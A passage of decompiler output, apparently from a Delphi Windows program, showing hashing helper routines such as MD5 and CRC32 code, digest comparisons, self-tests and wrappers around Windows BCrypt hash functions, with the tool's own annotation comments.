    v4 = *(_DWORD *)(a2 - 4);
  if ( v4 != 64 )
    return 0;
  v6 = (unsigned __int16 *)sub_407790(a2);
  do
  {
    if ( sub_424290(v6, a1, 1) != 1 )
      return 0;
    v6 += 2;
    ++a1;
    --v3;
  }
  while ( v3 > 0 );
  return 1;
}

//----- (00439450) --------------------------------------------------------
bool __fastcall sub_439450(int *a1, int a2)
{
  int v3; // eax

  v3 = *a1;
  return a1[1] == *(_DWORD *)(a2 + 4)
      && v3 == *(_DWORD *)a2
      && a1[3] == *(_DWORD *)(a2 + 12)
      && a1[2] == *(_DWORD *)(a2 + 8)
      && a1[5] == *(_DWORD *)(a2 + 20)
      && a1[4] == *(_DWORD *)(a2 + 16)
      && *((_QWORD *)a1 + 3) == *(_QWORD *)(a2 + 24);
}

//----- (004394A0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_4394A0@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>)
{
  int v5; // esi
  unsigned int v7[2]; // [esp-20h] [ebp-2Ch] BYREF
  void **v8; // [esp-18h] [ebp-24h]
  _DWORD v9[5]; // [esp-14h] [ebp-20h] BYREF
  void *v10; // [esp+0h] [ebp-Ch] BYREF
  volatile __int32 *v11; // [esp+4h] [ebp-8h]
  int v12; // [esp+8h] [ebp-4h] BYREF
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v12 = 0;
  v10 = 0;
  v9[4] = a3;
  v9[3] = a4;
  v11 = a2;
  v9[2] = &savedregs;
  v9[1] = &loc_439544;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_43951F;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v5 = 32;
  sub_406C44(&v12);
  do
  {
    sub_4154B0(*a1, 2, (int *)&v10);
    sub_407910(&v12, v10);
    ++a1;
    --v5;
  }
  while ( v5 > 0 );
  sub_406FE8(v11, v12);
  __writefsdword(0, v7[0]);
  v8 = (void **)&loc_439526;
  sub_406C44(&v12);
  __writefsdword(0, (unsigned int)v11);
  savedregs = &loc_43954B;
  sub_406C44(&v10);
  return sub_406C44(&v12);
}
// 4394A0: could not find valid save-restore pair for ebx
// 4394A0: could not find valid save-restore pair for esi
// 439536: bad sp value at call
// 43953E: bad sp value at call

//----- (00439560) --------------------------------------------------------
char __fastcall sub_439560(_BYTE *a1, int a2)
{
  int v3; // ebx
  int v4; // eax
  unsigned __int16 *v6; // esi

  v3 = 64;
  v4 = a2;
  if ( a2 )
    v4 = *(_DWORD *)(a2 - 4);
  if ( v4 != 128 )
    return 0;
  v6 = (unsigned __int16 *)sub_407790(a2);
  do
  {
    if ( sub_424290(v6, a1, 1) != 1 )
      return 0;
    v6 += 2;
    ++a1;
    --v3;
  }
  while ( v3 > 0 );
  return 1;
}

//----- (004395D0) --------------------------------------------------------
bool __fastcall sub_4395D0(int *a1, int a2)
{
  int v3; // eax

  v3 = *a1;
  return a1[1] == *(_DWORD *)(a2 + 4)
      && v3 == *(_DWORD *)a2
      && a1[3] == *(_DWORD *)(a2 + 12)
      && a1[2] == *(_DWORD *)(a2 + 8)
      && a1[5] == *(_DWORD *)(a2 + 20)
      && a1[4] == *(_DWORD *)(a2 + 16)
      && a1[7] == *(_DWORD *)(a2 + 28)
      && a1[6] == *(_DWORD *)(a2 + 24)
      && a1[9] == *(_DWORD *)(a2 + 36)
      && a1[8] == *(_DWORD *)(a2 + 32)
      && a1[11] == *(_DWORD *)(a2 + 44)
      && a1[10] == *(_DWORD *)(a2 + 40)
      && a1[13] == *(_DWORD *)(a2 + 52)
      && a1[12] == *(_DWORD *)(a2 + 48)
      && *((_QWORD *)a1 + 7) == *(_QWORD *)(a2 + 56);
}

//----- (00439660) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_439660@<eax>(unsigned __int8 *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<esi>)
{
  int v5; // esi
  unsigned int v7[2]; // [esp-20h] [ebp-2Ch] BYREF
  void **v8; // [esp-18h] [ebp-24h]
  _DWORD v9[5]; // [esp-14h] [ebp-20h] BYREF
  void *v10; // [esp+0h] [ebp-Ch] BYREF
  volatile __int32 *v11; // [esp+4h] [ebp-8h]
  int v12; // [esp+8h] [ebp-4h] BYREF
  void *savedregs; // [esp+Ch] [ebp+0h] BYREF

  v12 = 0;
  v10 = 0;
  v9[4] = a3;
  v9[3] = a4;
  v11 = a2;
  v9[2] = &savedregs;
  v9[1] = &loc_439704;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4396DF;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v5 = 64;
  sub_406C44(&v12);
  do
  {
    sub_4154B0(*a1, 2, (int *)&v10);
    sub_407910(&v12, v10);
    ++a1;
    --v5;
  }
  while ( v5 > 0 );
  sub_406FE8(v11, v12);
  __writefsdword(0, v7[0]);
  v8 = (void **)&loc_4396E6;
  sub_406C44(&v12);
  __writefsdword(0, (unsigned int)v11);
  savedregs = &loc_43970B;
  sub_406C44(&v10);
  return sub_406C44(&v12);
}
// 439660: could not find valid save-restore pair for ebx
// 439660: could not find valid save-restore pair for esi
// 4396F6: bad sp value at call
// 4396FE: bad sp value at call

//----- (00439720) --------------------------------------------------------
int __fastcall sub_439720(_DWORD *a1, int a2, int a3)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v5; // [esp-8h] [ebp-18h]
  int *v6; // [esp-4h] [ebp-14h]
  int v7; // [esp+4h] [ebp-Ch] BYREF
  unsigned __int8 v8; // [esp+Bh] [ebp-5h]
  _DWORD *v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = a1;
  v8 = 0;
  v6 = &savedregs;
  v5 = &loc_4397F5;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *off_467F38[0]
    && (*(int (__stdcall **)(_DWORD *, int, _DWORD, int))off_467F38[0])(v9, a2, 0, a3) >= 0
    && (v7 = 0,
        ((int (__stdcall *)(_DWORD, const wchar_t *, _DWORD *, int, int *, _DWORD))*off_467FB4)(
          *v9,
          L"ObjectLength",
          v9 + 1,
          4,
          &v7,
          0) >= 0)
    && (v7 = 0,
        ((int (__stdcall *)(_DWORD, const wchar_t *, _DWORD *, int, int *, _DWORD))*off_467FB4)(
          *v9,
          L"HashDigestLength",
          v9 + 2,
          4,
          &v7,
          0) >= 0) )
  {
    v8 = 1;
    __writefsdword(0, (unsigned int)ExceptionList);
    v6 = (int *)&loc_4397FC;
  }
  else
  {
    System::__linkproc__ TryFinallyExit(ExceptionList, v5, v6);
  }
  return v8;
}
// 4397EA: conditional instruction was optimized away because %var_5.1==1
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 439808: using guessed type wchar_t aObjectlength[13];
// 439824: using guessed type wchar_t aHashdigestleng[17];
// 467F38: using guessed type int *off_467F38[2];
// 467FB4: using guessed type int *off_467FB4;
// 439720: using guessed type int var_C;

//----- (00439850) --------------------------------------------------------
_DWORD *__fastcall sub_439850(_DWORD *result)
{
  *result = 0;
  result[1] = 0;
  result[2] = 0;
  return result;
}

//----- (00439860) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_439860@<eax>(_DWORD *a1@<edx>, unsigned int a2@<ecx>, int a3@<edi>)
{
  int v6; // edx
  int v7; // eax
  _DWORD v9[5]; // [esp-14h] [ebp-1Ch] BYREF
  void *v10; // [esp+0h] [ebp-8h] BYREF
  int v11; // [esp+4h] [ebp-4h] BYREF
  void *savedregs; // [esp+8h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9[2] = &savedregs;
  v9[1] = &loc_4398C6;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_4154B0(a2, 8, (int *)&v10);
  sub_407968(&v11, a1, v10);
  LOBYTE(v6) = 1;
  v7 = unknown_libname_85(off_411F40, v6, v11);
  sub_406340(v7, (int)a1, (int)&savedregs, a3, a2);
  __writefsdword(0, (unsigned int)v10);
  savedregs = &loc_4398CD;
  return sub_406CA4((int)&v10, 2);
}
// 4398C0: bad sp value at call
// 4398A1: variable 'v6' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);

//----- (004398E0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_4398E0@<eax>(_DWORD *a1@<edx>, unsigned int a2@<ecx>, int a3@<edi>)
{
  int v6; // edx
  int v7; // eax
  _DWORD v9[5]; // [esp-14h] [ebp-1Ch] BYREF
  void *v10; // [esp+0h] [ebp-8h] BYREF
  int v11; // [esp+4h] [ebp-4h] BYREF
  void *savedregs; // [esp+8h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9[2] = &savedregs;
  v9[1] = &loc_439946;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_4154B0(a2, 8, (int *)&v10);
  sub_407968(&v11, a1, v10);
  LOBYTE(v6) = 1;
  v7 = unknown_libname_85(off_411F40, v6, v11);
  sub_406340(v7, (int)a1, (int)&savedregs, a3, a2);
  __writefsdword(0, (unsigned int)v10);
  savedregs = &loc_43994D;
  return sub_406CA4((int)&v10, 2);
}
// 439940: bad sp value at call
// 439921: variable 'v6' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);

//----- (00439960) --------------------------------------------------------
int sub_439960()
{
  return 64;
}

//----- (004399F0) --------------------------------------------------------
int __usercall sub_4399F0@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v6; // esi
  int v7; // edx
  int v8; // eax
  int v9; // edx
  int v10; // eax
  unsigned int v12[2]; // [esp-14h] [ebp-30h] BYREF
  int *v13; // [esp-Ch] [ebp-28h]
  int v14; // [esp-8h] [ebp-24h]
  int v15; // [esp-4h] [ebp-20h]
  __int32 v16; // [esp+0h] [ebp-1Ch] BYREF
  __int32 v17; // [esp+4h] [ebp-18h] BYREF
  int v18; // [esp+8h] [ebp-14h] BYREF
  int v19; // [esp+Ch] [ebp-10h] BYREF
  int *v20; // [esp+10h] [ebp-Ch]
  int v21; // [esp+14h] [ebp-8h] BYREF
  int v22; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v21 = 0;
  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = a3;
  v14 = a5;
  v22 = a1;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_439ACD;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v6 = a2 & 0x7F;
  if ( !sub_438FC0(&v21, (int)*(&off_467410 + v6)) )
  {
    sub_407968(&v19, L"Self-test error ", *(&off_467410 + v6));
    LOBYTE(v7) = 1;
    v8 = unknown_libname_85(off_411F40, v7, v19);
    sub_406340(v8, a2, (int)&savedregs, a4, v6);
  }
  v20 = &v21;
  if ( v21 != v22 )
  {
    sub_439030((int)&v21, &v17, a2, v6);
    sub_439030((int)&v22, &v16, a2, v6);
    sub_4079F0(&v18, 4);
    LOBYTE(v9) = 1;
    v10 = unknown_libname_85(off_411F40, v9, v18);
    sub_406340(v10, a2, (int)&savedregs, a4, v6);
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_439AD4;
  return sub_406CA4((int)&v16, 4);
}
// 4399F0: could not find valid save-restore pair for ebx
// 4399F0: could not find valid save-restore pair for esi
// 439A4C: variable 'v7' is possibly undefined
// 439AA8: variable 'v9' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 439AE8: using guessed type wchar_t aSelfTestError[17];

//----- (00439B70) --------------------------------------------------------
int sub_439B70()
{
  return 64;
}

//----- (00439CC0) --------------------------------------------------------
int __fastcall sub_439CC0(int a1, unsigned __int8 *a2, int a3)
{
  int v5; // edi
  int v6; // edx
  int v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v12; // [esp-4h] [ebp-30h]
  __int32 v13; // [esp+Ch] [ebp-20h] BYREF
  __int32 v14; // [esp+10h] [ebp-1Ch] BYREF
  int v15; // [esp+14h] [ebp-18h] BYREF
  int v16; // [esp+18h] [ebp-14h] BYREF
  unsigned __int8 v17[16]; // [esp+1Ch] [ebp-10h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v16 = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_439D98;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v5 = a3 & 0x7F;
  if ( !sub_4390F0(v17, (int)*(&off_467420 + v5)) )
  {
    sub_407968(&v16, L"Self-test error ", *(&off_467420 + v5));
    LOBYTE(v6) = 1;
    v7 = unknown_libname_85(off_411F40, v6, v16);
    sub_406340(v7, a3, (int)&savedregs, v5, (int)a2);
  }
  if ( !sub_439160((int *)a2, (int)v17) )
  {
    sub_4391B0(v17, &v14, a3, (int)a2);
    sub_4391B0(a2, &v13, a3, (int)a2);
    sub_4079F0(&v15, 4);
    LOBYTE(v8) = 1;
    v9 = unknown_libname_85(off_411F40, v8, v15);
    sub_406340(v9, a3, (int)&savedregs, v5, (int)a2);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_439D9F;
  return sub_406CA4((int)&v13, 4);
}
// 439D1F: variable 'v6' is possibly undefined
// 439D73: variable 'v8' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 439DB4: using guessed type wchar_t aSelfTestError_0[17];

//----- (00439E30) --------------------------------------------------------
int sub_439E30()
{
  return 64;
}

//----- (00439FC0) --------------------------------------------------------
int __fastcall sub_439FC0(int a1, unsigned __int8 *a2, int a3)
{
  int v5; // edi
  int v6; // edx
  int v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-3Ch] BYREF
  int *v12; // [esp-4h] [ebp-34h]
  __int32 v13; // [esp+Ch] [ebp-24h] BYREF
  __int32 v14; // [esp+10h] [ebp-20h] BYREF
  int v15; // [esp+14h] [ebp-1Ch] BYREF
  int v16; // [esp+18h] [ebp-18h] BYREF
  _DWORD v17[5]; // [esp+1Ch] [ebp-14h] BYREF
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v16 = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_43A098;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v5 = a3 & 0x7F;
  if ( !sub_439270(v17, (int)*(&off_467430 + v5)) )
  {
    sub_407968(&v16, L"Self-test error ", *(&off_467430 + v5));
    LOBYTE(v6) = 1;
    v7 = unknown_libname_85(off_411F40, v6, v16);
    sub_406340(v7, a3, (int)&savedregs, v5, (int)a2);
  }
  if ( !sub_4392E0((int *)a2, v17) )
  {
    sub_439320((unsigned __int8 *)v17, &v14, a3, (int)a2);
    sub_439320(a2, &v13, a3, (int)a2);
    sub_4079F0(&v15, 4);
    LOBYTE(v8) = 1;
    v9 = unknown_libname_85(off_411F40, v8, v15);
    sub_406340(v9, a3, (int)&savedregs, v5, (int)a2);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_43A09F;
  return sub_406CA4((int)&v13, 4);
}
// 43A01F: variable 'v6' is possibly undefined
// 43A073: variable 'v8' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 43A0B4: using guessed type wchar_t aSelfTestError_1[17];

//----- (0043A130) --------------------------------------------------------
int sub_43A130()
{
  return 64;
}

//----- (0043A380) --------------------------------------------------------
int __fastcall sub_43A380(int a1, unsigned __int8 *a2, int a3)
{
  int v5; // edi
  int v6; // edx
  int v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-48h] BYREF
  int *v12; // [esp-4h] [ebp-40h]
  __int32 v13; // [esp+Ch] [ebp-30h] BYREF
  __int32 v14; // [esp+10h] [ebp-2Ch] BYREF
  int v15; // [esp+14h] [ebp-28h] BYREF
  int v16; // [esp+18h] [ebp-24h] BYREF
  unsigned __int8 v17[32]; // [esp+1Ch] [ebp-20h] BYREF
  int savedregs; // [esp+3Ch] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v16 = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_43A458;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v5 = a3 & 0x7F;
  if ( !sub_4393E0(v17, (int)*(&off_467440 + v5)) )
  {
    sub_407968(&v16, L"Self-test error ", *(&off_467440 + v5));
    LOBYTE(v6) = 1;
    v7 = unknown_libname_85(off_411F40, v6, v16);
    sub_406340(v7, a3, (int)&savedregs, v5, (int)a2);
  }
  if ( !sub_439450((int *)a2, (int)v17) )
  {
    sub_4394A0(v17, &v14, a3, (int)a2);
    sub_4394A0(a2, &v13, a3, (int)a2);
    sub_4079F0(&v15, 4);
    LOBYTE(v8) = 1;
    v9 = unknown_libname_85(off_411F40, v8, v15);
    sub_406340(v9, a3, (int)&savedregs, v5, (int)a2);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_43A45F;
  return sub_406CA4((int)&v13, 4);
}
// 43A3DF: variable 'v6' is possibly undefined
// 43A433: variable 'v8' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 43A474: using guessed type wchar_t aSelfTestError_2[17];

//----- (0043A4F0) --------------------------------------------------------
int sub_43A4F0()
{
  return 128;
}

//----- (0043A940) --------------------------------------------------------
int __fastcall sub_43A940(int a1, unsigned __int8 *a2, int a3)
{
  int v5; // edi
  int v6; // edx
  int v7; // eax
  int v8; // edx
  int v9; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-68h] BYREF
  int *v12; // [esp-4h] [ebp-60h]
  __int32 v13; // [esp+Ch] [ebp-50h] BYREF
  __int32 v14; // [esp+10h] [ebp-4Ch] BYREF
  int v15; // [esp+14h] [ebp-48h] BYREF
  int v16; // [esp+18h] [ebp-44h] BYREF
  unsigned __int8 v17[64]; // [esp+1Ch] [ebp-40h] BYREF
  int savedregs; // [esp+5Ch] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v16 = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_43AA18;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  v5 = a3 & 0x7F;
  if ( !sub_439560(v17, (int)*(&off_467450 + v5)) )
  {
    sub_407968(&v16, L"Self-test error ", *(&off_467450 + v5));
    LOBYTE(v6) = 1;
    v7 = unknown_libname_85(off_411F40, v6, v16);
    sub_406340(v7, a3, (int)&savedregs, v5, (int)a2);
  }
  if ( !sub_4395D0((int *)a2, (int)v17) )
  {
    sub_439660(v17, &v14, a3, (int)a2);
    sub_439660(a2, &v13, a3, (int)a2);
    sub_4079F0(&v15, 4);
    LOBYTE(v8) = 1;
    v9 = unknown_libname_85(off_411F40, v8, v15);
    sub_406340(v9, a3, (int)&savedregs, v5, (int)a2);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_43AA1F;
  return sub_406CA4((int)&v13, 4);
}
// 43A99F: variable 'v6' is possibly undefined
// 43A9F3: variable 'v8' is possibly undefined
// 411F40: using guessed type int (*off_411F40[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 43AA34: using guessed type wchar_t aSelfTestError_3[17];

//----- (0043AAB0) --------------------------------------------------------
int __fastcall sub_43AAB0(int a1)
{
  return ~*(_DWORD *)(a1 + 8);
}

//----- (0043AAC0) --------------------------------------------------------
int __fastcall sub_43AAC0(int result)
{
  *(_DWORD *)(result + 8) = -1;
  return result;
}

//----- (0043AAD0) --------------------------------------------------------
int __fastcall sub_43AAD0(int result, _BYTE *a2, int a3)
{
  _BYTE *v3; // ebx
  unsigned int v4; // ecx

  if ( a3 )
  {
    v3 = &a2[a3];
    v4 = *(_DWORD *)(result + 8);
    do
      v4 = (v4 >> 8) ^ dword_466F9C[(unsigned __int8)(v4 ^ *a2++)];
    while ( v3 != a2 );
    *(_DWORD *)(result + 8) = v4;
  }
  return result;
}
// 466F9C: using guessed type int dword_466F9C[256];

//----- (0043AB10) --------------------------------------------------------
int __fastcall sub_43AB10(_DWORD *a1, _DWORD *a2)
{
  int v4; // eax
  unsigned int v5; // ecx
  __int64 v6; // rt0
  unsigned int v7; // eax
  int result; // eax
  __int64 v9; // [esp+Ch] [ebp-8h] BYREF

  *a2 = 0;
  a2[1] = 0;
  a2[2] = 0;
  a2[3] = 0;
  v4 = a1[8];
  v5 = v4 & 0x3F;
  HIDWORD(v6) = a1[9];
  LODWORD(v6) = v4;
  v9 = 8 * v6;
  if ( v5 >= 0x38 )
    v7 = 120 - v5;
  else
    v7 = 56 - v5;
  (*(void (__fastcall **)(_DWORD *, void *, unsigned int))(*a1 + 4))(a1, &unk_4673B8, v7);
  (*(void (__fastcall **)(_DWORD *, __int64 *, int))(*a1 + 4))(a1, &v9, 8);
  *a2 = a1[3];
  a2[1] = a1[4];
  a2[2] = a1[5];
  result = a1[6];
  a2[3] = result;
  return result;
}

//----- (0043ABB0) --------------------------------------------------------
_DWORD *__fastcall sub_43ABB0(_DWORD *result)
{
  _DWORD *v1; // edx

  v1 = result + 10;
  do
  {
    *v1 = 0;
    v1[1] = 0;
    v1 += 2;
  }
  while ( result + 26 != v1 );
  result[8] = 0;
  result[9] = 0;
  result[3] = 1732584193;
  result[4] = -271733879;
  result[5] = -1732584194;
  result[6] = 271733878;
  return result;
}

//----- (0043AC00) --------------------------------------------------------
int __fastcall sub_43AC00(int result, _DWORD *a2, unsigned int a3)
{
  _DWORD *v3; // ebx
  _DWORD *v4; // esi
  int v5; // ecx
  int v6; // ecx
  int v7; // [esp+8h] [ebp-8h]

  v3 = (_DWORD *)result;
  if ( a3 )
  {
    v4 = a2;
    v5 = *(_DWORD *)(result + 32) & 0x3F;
    *(_QWORD *)(result + 32) += a3;
    if ( v5 )
    {
      v7 = 64 - v5;
      if ( a3 < 64 - v5 )
        return System::Move(a2, (void *)(result + v5 + 40), a3);
      System::Move(a2, (void *)(result + v5 + 40), v7);
      v3[2] = v3 + 10;
      v3[2] += 64;
      sub_4389F0(v3 + 2, v3 + 10);
      v3[2] = v4;
      v3[2] += a3;
      v4 = (_DWORD *)((char *)v4 + v7);
    }
    else
    {
      *(_DWORD *)(result + 8) = a2;
      *(_DWORD *)(result + 8) += a3;
    }
    result = v3[8];
    v6 = result & 0x3F;
    if ( (result & 0x3F) != 0 )
    {
      v3[2] -= v6;
      result = System::Move((const void *)v3[2], v3 + 10, v6);
    }
    if ( v4 != (_DWORD *)v3[2] )
      return sub_4389F0(v3 + 2, v4);
  }
  return result;
}

//----- (0043ACC0) --------------------------------------------------------
int __fastcall sub_43ACC0(int a1)
{
  int result; // eax

  nullsub_2(a1);
  *(_DWORD *)(a1 + 8) = System::__linkproc__ GetMem(dword_4673FC);
  result = a1 + 8;
  *(_DWORD *)(a1 + 12) = 0;
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 405840: using guessed type int __fastcall nullsub_2(_DWORD);
// 4673FC: using guessed type int dword_4673FC;

//----- (0043ACF0) --------------------------------------------------------
int __usercall sub_43ACF0@<eax>(int a1@<eax>, int a2@<edi>)
{
  signed int v3; // eax
  int result; // eax
  _DWORD *v5; // [esp+4h] [ebp-4h]

  sub_43BA80(a1);
  v5 = (_DWORD *)(a1 + 8);
  if ( *(_DWORD *)(a1 + 12) )
  {
    v3 = (*(int (__stdcall **)(_DWORD))off_467ECC[0])(*(_DWORD *)(a1 + 12));
    if ( v3 < 0 )
      sub_439860(L"BCryptDestroyHash ", v3, a2);
    *(_DWORD *)(a1 + 12) = 0;
  }
  System::__linkproc__ FreeMem(*v5);
  result = a1 + 8;
  *v5 = 0;
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 43AD58: using guessed type wchar_t aBcryptdestroyh[19];
// 467ECC: using guessed type int *off_467ECC[2];

//----- (0043AD80) --------------------------------------------------------
int __usercall sub_43AD80@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int result; // eax
  signed int v4; // eax
  signed int v5; // eax
  int v6; // [esp+0h] [ebp-4h]

  v6 = a1 + 8;
  result = *(_DWORD *)(a1 + 12);
  if ( result )
  {
    v4 = (*(int (__stdcall **)(int, int, int, _DWORD))off_46813C[0])(result, a2, 16, 0);
    if ( v4 < 0 )
      sub_439860(L"BCryptFinishHash ", v4, a3);
    v5 = (*(int (__stdcall **)(_DWORD))off_467ECC[0])(*(_DWORD *)(v6 + 4));
    if ( v5 < 0 )
      sub_439860(L"BCryptDestroyHash ", v5, a3);
    result = v6;
    *(_DWORD *)(v6 + 4) = 0;
  }
  return result;
}
// 43ADF4: using guessed type wchar_t aBcryptfinishha[18];
// 43AE24: using guessed type wchar_t aBcryptdestroyh_0[19];
// 467ECC: using guessed type int *off_467ECC[2];
// 46813C: using guessed type int *off_46813C[3];

//----- (0043AE50) --------------------------------------------------------
int __usercall sub_43AE50@<eax>(int a1@<eax>, int a2@<edi>)
{
  int v2; // eax
  signed int v3; // eax
  int result; // eax
  _DWORD *v5; // [esp+0h] [ebp-4h]

  v5 = (_DWORD *)(a1 + 8);
  v2 = *(_DWORD *)(a1 + 12);
  if ( v2 )
  {
    v3 = (*(int (__stdcall **)(int))off_467ECC[0])(v2);
    if ( v3 < 0 )
      sub_439860(L"BCryptDestroyHash ", v3, a2);
    v5[1] = 0;
  }
  result = (*(int (__stdcall **)(int, _DWORD *, _DWORD, int, _DWORD, _DWORD, _DWORD))off_467FB0[0])(
             dword_4673F8,
             v5 + 1,
             *v5,
             dword_4673FC,
             0,
             0,
             0);
  if ( result < 0 )
    return sub_439860(L"BCryptCreateHash ", result, a2);
  return result;
}
// 43AED8: using guessed type wchar_t aBcryptdestroyh_1[19];
// 43AF0C: using guessed type wchar_t aBcryptcreateha[18];
// 4673F8: using guessed type int dword_4673F8;
// 4673FC: using guessed type int dword_4673FC;
// 467ECC: using guessed type int *off_467ECC[2];
// 467FB0: using guessed type int *off_467FB0[2];

//----- (0043AF30) --------------------------------------------------------
int __usercall sub_43AF30@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 12);
  if ( result )
  {
    result = ((int (__stdcall *)(int, int, int, _DWORD))*off_467EE8)(result, a2, a3, 0);
    if ( result < 0 )
      return sub_439860(L"BCryptHashData ", result, a4);
  }
  return result;
}
// 43AF78: using guessed type wchar_t aBcrypthashdata[16];
// 467EE8: using guessed type int *off_467EE8;

//----- (0043AFA0) --------------------------------------------------------
int __usercall sub_43AFA0@<eax>(int a1@<eax>, int a2@<edi>)
{
  signed int v3; // eax
  int result; // eax

  nullsub_2(a1);
  *(_DWORD *)(a1 + 8) = System::__linkproc__ GetMem(dword_4673FC);
  *(_DWORD *)(a1 + 12) = 0;
  v3 = (*(int (__stdcall **)(int, int, _DWORD, int, _DWORD, _DWORD, int))off_467FB0[0])(
         dword_4673F8,
         a1 + 12,
         *(_DWORD *)(a1 + 8),
         dword_4673FC,
         0,
         0,
         32);
  if ( v3 < 0 )
    sub_4398E0(L"BCryptCreateHash ", v3, a2);
  result = a1 + 8;
  *(_BYTE *)(a1 + 16) = 0;
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 405840: using guessed type int __fastcall nullsub_2(_DWORD);
// 43B020: using guessed type wchar_t aBcryptcreateha_0[18];
// 4673F8: using guessed type int dword_4673F8;
// 4673FC: using guessed type int dword_4673FC;
// 467FB0: using guessed type int *off_467FB0[2];

//----- (0043B050) --------------------------------------------------------
int __usercall sub_43B050@<eax>(int a1@<eax>, int a2@<edi>)
{
  signed int v3; // eax
  int result; // eax
  _DWORD *v5; // [esp+4h] [ebp-4h]

  sub_43BA80(a1);
  v5 = (_DWORD *)(a1 + 8);
  if ( *(_DWORD *)(a1 + 12) )
  {
    v3 = (*(int (__stdcall **)(_DWORD))off_467ECC[0])(*(_DWORD *)(a1 + 12));
    if ( v3 < 0 )
